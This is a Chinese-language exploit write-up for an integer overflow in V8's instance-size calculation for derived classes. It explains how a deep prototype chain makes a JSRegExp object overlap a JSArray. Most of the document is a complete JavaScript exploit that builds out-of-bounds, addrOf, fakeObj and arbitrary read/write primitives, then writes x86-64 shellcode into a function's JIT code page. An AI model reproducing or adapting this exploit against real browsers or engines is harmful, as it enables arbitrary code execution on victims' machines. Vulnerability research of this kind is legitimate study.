在实例化一个新的javascript对象时，在计算所需的分配大小时存在一个整数溢出

```
void JSFunction::CalculateInstanceSizeForDerivedClass(    Handle<JSFunction> function, InstanceType instance_type,    int requested_embedder_fields, int* instance_size,    int* in_object_properties) {  Isolate* isolate = function->GetIsolate();  int expected_nof_properties = 0;  for (PrototypeIterator iter(isolate, function, kStartAtReceiver);       !iter.IsAtEnd(); iter.Advance()) {    Handle<JSReceiver> current =        PrototypeIterator::GetCurrent<JSReceiver>(iter);    if (!current->IsJSFunction()) break;    Handle<JSFunction> func(Handle<JSFunction>::cast(current));    // The super constructor should be compiled for the number of expected    // properties to be available.    Handle<SharedFunctionInfo> shared(func->shared());    if (shared->is_compiled() ||        Compiler::Compile(func, Compiler::CLEAR_EXCEPTION)) {      DCHECK(shared->is_compiled());      expected_nof_properties += shared->expected_nof_properties(); <- [1]     }    if (!IsDerivedConstructor(shared->kind())) {      break;    }  }  CalculateInstanceSizeHelper(instance_type, requested_embedder_fields,                              expected_nof_properties, instance_size,                              in_object_properties);}
```
在[1]处可以发生int整数溢出，产生一个负数，它将传递给CalculateInstanceSizeHelper函数。

这里我们通过递归造出了一个很长的原型链，这将会导致[1]位置处出现整数溢出。
（https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain）
```
    const derived_n = eval(`(function derived_n(i) {		if (i == 0) {			class Derived extends RegExp {				constructor(e) {					super(e);					return;					${"this.a=0;".repeat(0x7fffb-8)}				}			}			return Derived;		}		class DerivedN extends derived_n(i-1) {			constructor(e) {				super(e);				return;				${"this.a=0;".repeat(0x80000-8)}			}		}		return DerivedN;	})`);	const ctor = derived_n(0x3ff);
```

而整数溢出的值又会作为参数传入CalculateInstanceSizeHelper(instance_type, requested_embedder_fields,expected_nof_properties, instance_size, in_object_properties);中

```
void JSFunction::CalculateInstanceSizeHelper(InstanceType instance_type,                                             int requested_embedder_fields,                                             int requested_in_object_properties,                                             int* instance_size,                                             int* in_object_properties) {  int header_size = JSObject::GetHeaderSize(instance_type);  DCHECK_LE(requested_embedder_fields,            (JSObject::kMaxInstanceSize - header_size) >> kPointerSizeLog2);  *instance_size =      Min(header_size +              ((requested_embedder_fields + requested_in_object_properties)               << kPointerSizeLog2),          JSObject::kMaxInstanceSize);  *in_object_properties = ((*instance_size - header_size) >> kPointerSizeLog2) -                          requested_embedder_fields;
}
```
在该函数中，我们需要注意instance_size的计算:
```
*instance_size =
      Min(header_size +
              ((requested_embedder_fields + requested_in_object_properties)
               << kPointerSizeLog2),
          JSObject::kMaxInstanceSize);
```
这里的requested_in_object_properties就是上面溢出的变量，只要我们控制原型链的大小就可以使得instance_size按我们的想法来减小（当instance_size<header_size时，就会出现object重叠）。

因为在新的object分配时会根据map中的instance_size来计算下一个object的地址，所以我们就可以构造出重叠。

我们的目标是构造如下的重叠：
```
		//       JSRegExp              JSArray		// 0000: map		// 0008: properties_or_hash    map		// 0010: elements              properties_or_hash		// 0018: data                  elements              <--- corrupt		// 0020: source                length                <--- corrupt		// 0028: flags		// 0030: size		// 0038: last_index
```
这样JSArray的length就会是source的地址，这必然会导致JSArray出现数组越界，之后就可以把它当作数组越界的漏洞来写利用了：

1、首先我们利用上面重叠的JSArray来修改相邻的float array的size由他来进行数组越界（这里之所以又引入一个array，是为了获得一个float类型的数组，而不是object）。
2、之后我们准备一个object和一个arraybuffer。
3、通过在越界数组中查找属性和size的方式分别确定object和arraybuffer的bk在越界数组中的偏移。
4、利用object来构造adderof原语，利用bk来构造oor、oow原语。
 
exp：
```
const MAX_ITERATIONS = 100000;const maxSize = 1028*8;const buf = new ArrayBuffer(8);const f64 = new Float64Array(buf);const u32 = new Uint32Array(buf);// Floating point to 64-bit unsigned integerfunction f2i(val){     f64[0] = val;    let tmp = Array.from(u32);    return tmp[1] * 0x100000000 + tmp[0];}// 64-bit unsigned integer to Floating pointfunction i2f(val){    let tmp = [];    tmp[0] = parseInt(val % 0x100000000);    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);    u32.set(tmp);    return f64[0];}// 64-bit unsigned integer to hexfunction hex(i){    return i.toString(16).padStart(16, "0");}function success_value(msg, value) {    console.log("[+] "+msg+hex(value));}function gc(){    for(let i=0;i<0x10;i++)    {        new Array(0x1000000);    }}var a = (function (value) {	if (value) {		console.log('hello');	}});var oobArray = undefined;var objArray = undefined;var dataBuf = undefined;function foo(){		// So, we target the integer overflow to create a JSRegExp object with an		// instance_size of 8, and overlap this allocation with a JSArray object.		//		//       JSRegExp              JSArray		// 0000: map		// 0008: properties_or_hash    map		// 0010: elements              properties_or_hash		// 0018: data                  elements              <--- corrupt		// 0020: source                length                <--- corrupt		// 0028: flags		// 0030: size		// 0038: last_index		//		// The created JSRegExp object will be completely broken, but this doesn't		// matter - we will allocate the overlapping JSArray inside the constructor		// call before initialisation is finished, and during the initialisation of		// the regular expression, data and source will be written to, corrupting		// the elements and length fields of the array.		//		// We'll then quickly use this to modify an array buffer, and avoid holding		// references to either the JSRegExp or the JSArray (since both have highly		// invalid sizes) so that neither will be tenured when a gc triggers.    const derived_n = eval(`(function derived_n(i) {		if (i == 0) {			class Derived extends RegExp {				constructor(e) {					super(e);					return;					${"this.a=0;".repeat(0x7fffb-8)}				}			}			return Derived;		}		class DerivedN extends derived_n(i-1) {			constructor(e) {				super(e);				return;				${"this.a=0;".repeat(0x80000-8)}			}		}		return DerivedN;	})`);	const ctor = derived_n(0x3ff);	var array = null;	var pattern = new Object();	pattern.toString = function() {		// This is the allocation of the overlapping JSArray object. While this		// allocation is referenced, a garbage collection will crash!		array = new Array(8);		return 'c01db33f';	}	// This is the allocation of the overlapping JSRegExp object which will 	// corrupt the array; we never hold a reference to it (except the 'this'	// reference during construction)	const reg = new ctor(pattern);	arr = new Array(0x10); 	arr[0] = 1.1;	//%DebugPrint(a);	//%DebugPrint(array);	array[7] = 0xaaaaaaa;	//%DebugPrint(arr);	array = null;    return arr;}oobArray = foo();objArray = {m:i2f(0xdeadbeef), n:a};dataBuf = new ArrayBuffer(0x2fe);var floatObjectIdx = 0;for(let i=0; i<maxSize; i++) {    if(f2i(oobArray[i]) == 0xdeadbeef) {        floatObjectIdx = i + 1;        print("[+] float idx of object is: 0x"+hex(floatObjectIdx));        break;    }} // looking for backing_stroe in dataBufvar floatArrayBufIdx = 0;for(let i=0; i<maxSize; i++) {    if(f2i(oobArray[i]) == 0x2fe) {        floatArrayBufIdx = i - 2;        print("[+] float idx of array buf backing store is: 0x"+hex(floatArrayBufIdx));        break;    }}//%DebugPrint(objArray);//%SystemBreak();/*oobArray_addr = addrOf(oobArray);dataBuf_addr = addrOf(dataBuf);objArray_addr = addrOf(objArray)print("[+] oobArray_addr: 0x"+hex(oobArray_addr));print("[+] dataBuf_addr: 0x"+hex(dataBuf_addr));print("[+] objArray_addr: 0x"+hex(objArray_addr));%DebugPrint(oobArray);%DebugPrint(objArray);%DebugPrint(dataBuf);%SystemBreak();var dataView = new DataView(dataBuf);*///floatArrayBufIdx = 0x84;var dataView = new DataView(dataBuf);// build addrOf primitive function addrOf(objPara){    objArray.n=objPara;    return f2i(oobArray[floatObjectIdx]) - 1;}// build fakeObj primitivefunction fakeObj(fakeObjAddr){    oobArray[floatObjectIdx] = i2f(fakeObjAddr);    return objArray.n;}// build aar primitivefunction dataViewRead64(addr){	oobArray[floatArrayBufIdx]=i2f(addr);	%DebugPrint(dataBuf);	//%SystemBreak();    return f2i(dataView.getFloat64(0, true));}// build aaw primitivefunction dataViewWrite64(addr, value){    oobArray[floatArrayBufIdx] = i2f(addr);    return dataView.setFloat64(0, f2i(value), True);}function dataViewWrite(addr, payload){    oobArray[floatArrayBufIdx] = i2f(addr);    for(let i=0; i<payload.length; i++) {        dataView.setUint8(i, payload[i]);    }    return ;}var func_addr = addrOf(a);%DebugPrint(a);print("[+] func addr: 0x"+hex(func_addr));var jit_addr = dataViewRead64(func_addr+0x38)-1;print("[+] jit obj addr: 0x"+hex(jit_addr));var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];//write shellcode to jit codedataViewWrite(i2f(jit_addr), shellcode);
```

